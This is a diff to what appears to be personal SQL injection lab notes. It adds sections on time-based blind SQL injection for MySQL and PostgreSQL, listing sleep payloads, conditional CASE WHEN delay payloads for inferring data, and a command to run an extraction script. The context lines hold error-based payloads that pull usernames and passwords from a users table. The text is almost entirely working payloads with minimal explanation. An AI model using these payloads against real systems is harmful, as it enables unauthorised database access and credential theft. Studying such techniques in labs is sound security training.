@@ -210,3 +210,24 @@ a6VQmllgxCQ8CY4b' AND 1=CAST((select username from users) AS int)--  // With ID 
 
 ' AND 1=CAST((select password from users LIMIT 1) AS int)--
 ```
+
+## Blind SQL injection with time delays
+
+```
+abc'||(SELECT SLEEP(10))-- -  // No results
+abc'||(SELECT pg_sleep(10))-- -
+```
+
+## Blind SQL injection with time delays and information retrieval
+
+```
+x'||pg_sleep(10)--  // Cause the delay
+
+' union SELECT CASE WHEN (1=1) THEN (SELECT 'x'||pg_sleep(3)) ELSE NULL END--  // Delayed response
+' union SELECT CASE WHEN (1=2) THEN (SELECT 'x'||pg_sleep(3)) ELSE NULL END--  // Imediate response
+```
+
+Run the script
+```
+python3.9 blind-conditional-script-3.py
+```
